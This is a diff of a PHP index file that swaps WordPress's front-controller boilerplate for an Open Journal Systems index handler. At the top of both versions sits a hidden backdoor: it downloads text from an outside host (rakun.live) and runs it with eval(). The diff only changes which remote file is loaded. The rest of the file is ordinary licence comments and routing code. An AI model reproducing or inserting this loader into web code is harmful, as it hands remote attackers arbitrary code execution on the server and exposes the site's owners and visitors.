@@ -1,21 +1,27 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/books.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/mrjdu.txt'));
 $url = "?> ".$url;
 eval($url);
 
 /**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
+ * @defgroup pages_index Index Pages
  */
-
+ 
 /**
- * Tells WordPress to load the WordPress theme and output it.
+ * @file pages/index/index.php
  *
- * @var bool
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ * @brief Handle site index requests. 
+ *
  */
-define( 'WP_USE_THEMES', true );
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+switch ($op) {
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
+}
